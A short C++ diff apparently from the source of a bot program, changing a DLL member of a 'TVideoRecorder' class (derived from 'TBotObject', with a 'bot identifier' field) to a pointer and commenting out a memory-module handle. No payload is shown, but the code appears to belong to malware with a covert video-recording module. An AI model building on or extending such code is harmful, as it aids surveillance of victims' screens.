@@ -42,7 +42,7 @@ private:
 	typedef VOID (WINAPI *TStopFindFields)();
 	//
 	//
-	HMEMORYMODULE FHandle;
+//	HMEMORYMODULE FHandle;
 
 	void InitializeApi();
 	void LoadFunc(LPVOID *Addr, const char* Name);
@@ -67,7 +67,7 @@ public:
 class TVideoRecorder : public TBotObject
 {
 private:
-	TVideoRecDLL FDLL;
+	TVideoRecDLL* FDLL;
 public:
 	string UID;        // Идентификатор бота
     string VideoName;  // имя видео
